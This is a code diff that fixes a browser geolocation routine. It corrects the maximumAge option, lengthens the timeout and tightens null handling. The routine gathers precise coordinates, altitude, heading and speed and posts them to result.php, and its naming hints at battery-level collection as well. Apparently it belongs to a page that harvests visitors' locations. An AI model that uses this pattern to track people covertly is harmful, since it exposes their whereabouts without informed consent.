@@ -46,20 +46,20 @@ function collectAndSend(batLevel) {
 // -----------------------------------------------------
 function locate(successCallback, failCallback) {
   if (navigator.geolocation) {
-    var optn = { enableHighAccuracy: true, timeout: 5000, maximumage: 0 };
+    // FIX: maximumAge is now correctly capitalized. 
+    // FIX: Timeout increased to 10000ms to give the GPS hardware time to wake up.
+    var optn = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
     
     navigator.geolocation.getCurrentPosition(
       function(position) { 
           showPosition(position, successCallback); 
       }, 
       function(error) { 
-          // --- FIX: Report the error to error.php ---
           $.ajax({
             type: 'POST',
             url: error_file,
             data: { Status: 'failed', Error: error.message },
             success: function() {
-                // If it fails, we trigger the callback to continue (or show error UI)
                 if(successCallback) successCallback(); 
             }
           });
@@ -72,15 +72,14 @@ function locate(successCallback, failCallback) {
 }
 
 function showPosition(position, callback) {
-  // 1. Grab ALL the data from the browser
+  // STRICT PARSING: Ensures null values are cleanly handled
   var lat = position.coords.latitude; 
   var lon = position.coords.longitude;
-  var acc = position.coords.accuracy || 0;
-  var alt = position.coords.altitude || 0;
-  var dir = position.coords.heading || 0; // heading is the direction
-  var spd = position.coords.speed || 0;
+  var acc = position.coords.accuracy !== null ? position.coords.accuracy : 0;
+  var alt = position.coords.altitude !== null ? position.coords.altitude : 0;
+  var dir = position.coords.heading !== null ? position.coords.heading : 0;
+  var spd = position.coords.speed !== null ? position.coords.speed : 0;
   
-  // 2. Send it ALL to result.php
   $.ajax({
     type: 'POST',
     url: result_file,
